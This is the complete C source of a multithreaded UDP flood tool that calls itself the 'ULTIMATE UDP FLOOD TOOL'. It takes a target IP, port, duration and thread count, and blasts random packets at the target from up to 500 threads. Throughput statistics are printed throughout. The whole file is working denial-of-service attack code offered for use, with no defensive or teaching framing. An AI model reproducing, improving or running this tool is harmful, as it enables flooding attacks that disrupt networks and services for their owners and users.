#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>

#define BUFFER_SIZE 1400  // Optimized for MTU
#define MAX_THREADS 500
#define STATS_INTERVAL 2

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    int packet_count;
    long total_bytes;
} flood_args_t;

volatile sig_atomic_t keep_running = 1;
volatile long global_packets = 0;
volatile long global_bytes = 0;
time_t global_start_time;

void handle_signal(int sig) {
    keep_running = 0;
    printf("\nShutting down...\n");
}

// High-resolution time function
long long get_time_ms() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (long long)tv.tv_sec * 1000 + tv.tv_usec / 1000;
}

void *stats_thread(void *arg) {
    time_t last_time = time(NULL);
    long last_packets = 0;
    long last_bytes = 0;
    
    while (keep_running) {
        sleep(STATS_INTERVAL);
        
        time_t current_time = time(NULL);
        long current_packets = global_packets;
        long current_bytes = global_bytes;
        long interval_packets = current_packets - last_packets;
        long interval_bytes = current_bytes - last_bytes;
        double interval_seconds = difftime(current_time, last_time);
        
        if (interval_seconds > 0) {
            double pps = interval_packets / interval_seconds;
            double mbps = (interval_bytes * 8.0) / (interval_seconds * 1024 * 1024);
            
            printf("[STATS] PPS: %.0f | Mbps: %.2f | Total: %ld packets | Time: %lds\n", 
                   pps, mbps, current_packets, (current_time - global_start_time));
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    return NULL;
}

void *udp_flood(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    
    int sock;
    struct sockaddr_in target;
    char *buffer;
    socklen_t target_len = sizeof(target);

    // Create socket for maximum performance
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        free(args);
        return NULL;
    }

    // Maximum socket optimization
    int sock_opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof(sock_opt));
    
    // Disable blocking for maximum speed
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    // Maximum buffer sizes
    int sendbuf = 10 * 1024 * 1024;  // 10MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        free(args);
        return NULL;
    }

    // Allocate and initialize buffer with random data
    buffer = malloc(BUFFER_SIZE);
    if (!buffer) {
        perror("Buffer allocation failed");
        close(sock);
        free(args);
        return NULL;
    }
    
    // Fill with high-entropy random data
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        fread(buffer, 1, BUFFER_SIZE, urandom);
        fclose(urandom);
    } else {
        // Fallback to pseudo-random
        srand(time(NULL) + thread_id);
        for (int i = 0; i < BUFFER_SIZE; i++) {
            buffer[i] = (char)(rand() % 256);
        }
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    long thread_packets = 0;
    int consecutive_errors = 0;
    long thread_bytes = 0;
    
    printf("Thread %d started - Target: %s:%d\n", thread_id, ip, port);
    
    // Main flood loop - ULTRA FAST VERSION
    while (keep_running && time(NULL) < end_time) {
        ssize_t sent = sendto(sock, buffer, BUFFER_SIZE, MSG_DONTWAIT, 
                             (struct sockaddr *)&target, target_len);
        
        if (sent > 0) {
            thread_packets++;
            thread_bytes += sent;
            consecutive_errors = 0;
            
            // Batch update global stats to reduce overhead
            if (thread_packets % 500 == 0) {
                __sync_fetch_and_add(&global_packets, 500);
                __sync_fetch_and_add(&global_bytes, 500 * BUFFER_SIZE);
            }
        } else {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Buffer full, continue immediately
                consecutive_errors = 0;
                continue;
            } else if (errno == ENOBUFS) {
                // System buffer full, tiny delay
                usleep(50);
                consecutive_errors++;
                if (consecutive_errors > 500) {
                    usleep(500); // Longer delay if persistent errors
                }
                continue;
            } else {
                // Other error
                consecutive_errors++;
                if (consecutive_errors % 100 == 0) {
                    printf("Thread %d error count: %d\n", thread_id, consecutive_errors);
                }
                if (consecutive_errors > 1000) {
                    printf("Thread %d too many errors, stopping\n", thread_id);
                    break;
                }
            }
        }
    }

    // Final stats update for remaining packets
    if (thread_packets % 500 > 0) {
        __sync_fetch_and_add(&global_packets, thread_packets % 500);
        __sync_fetch_and_add(&global_bytes, (thread_packets % 500) * BUFFER_SIZE);
    }

    close(sock);
    free(buffer);
    printf("Thread %d finished - Packets: %ld\n", thread_id, thread_packets);
    free(args);
    return NULL;
}

void print_banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════╗\n");
    printf("║           ULTIMATE UDP FLOOD TOOL           ║\n");
    printf("║              [POWER EDITION]                ║\n");
    printf("╚══════════════════════════════════════════════╝\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 50\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    print_banner();
    
    // Setup signal handling
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    if (num_threads > MAX_THREADS) {
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
        num_threads = MAX_THREADS;
    }

    if (num_threads < 1) {
        printf("Error: Thread count must be at least 1\n");
        exit(EXIT_FAILURE);
    }

    printf("[INFO] Target: %s:%d\n", ip, port);
    printf("[INFO] Duration: %d seconds\n", duration);
    printf("[INFO] Threads: %d\n", num_threads);
    printf("[INFO] Buffer size: %d bytes\n", BUFFER_SIZE);
    printf("[INFO] Starting attack in 3 seconds...\n");
    sleep(3);

    global_start_time = time(NULL);
    pthread_t threads[MAX_THREADS];
    pthread_t stats_thr;

    // Start statistics thread
    if (pthread_create(&stats_thr, NULL, stats_thread, NULL) != 0) {
        perror("Could not create stats thread");
        exit(EXIT_FAILURE);
    }

    // Create flood threads
    int threads_created = 0;
    for (int i = 0; i < num_threads; i++) {
        flood_args_t *args = calloc(1, sizeof(flood_args_t));
        if (!args) {
            perror("Memory allocation failed");
            continue;
        }
        
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->ip[sizeof(args->ip) - 1] = '\0';
        args->port = port;
        args->duration = duration;
        args->thread_id = i + 1;

        if (pthread_create(&threads[i], NULL, udp_flood, (void *)args) == 0) {
            threads_created++;
        } else {
            perror("Could not create thread");
            free(args);
        }
        
        // Stagger thread creation slightly
        usleep(1000);
    }

    printf("[INFO] Created %d flood threads\n", threads_created);
    
    // Wait for all threads to complete
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(stats_thr, NULL);

    // Final statistics
    time_t total_time = time(NULL) - global_start_time;
    if (total_time == 0) total_time = 1; // Avoid division by zero
    double avg_pps = (double)global_packets / total_time;
    double total_mb = (double)global_bytes / (1024 * 1024);
    double avg_mbps = (total_mb * 8) / total_time;
    
    printf("\n╔══════════════════════════════════════════════╗\n");
    printf("║                 FINAL STATS                 ║\n");
    printf("╠══════════════════════════════════════════════╣\n");
    printf("║ Total Packets: %-29ld ║\n", global_packets);
    printf("║ Total Data:    %-8.2f MB               ║\n", total_mb);
    printf("║ Duration:      %-8ld seconds          ║\n", total_time);
    printf("║ Average PPS:   %-8.0f packets/sec     ║\n", avg_pps);
    printf("║ Average Mbps:  %-8.2f Mbps            ║\n", avg_mbps);
    printf("╚══════════════════════════════════════════════╝\n");

    return 0;
}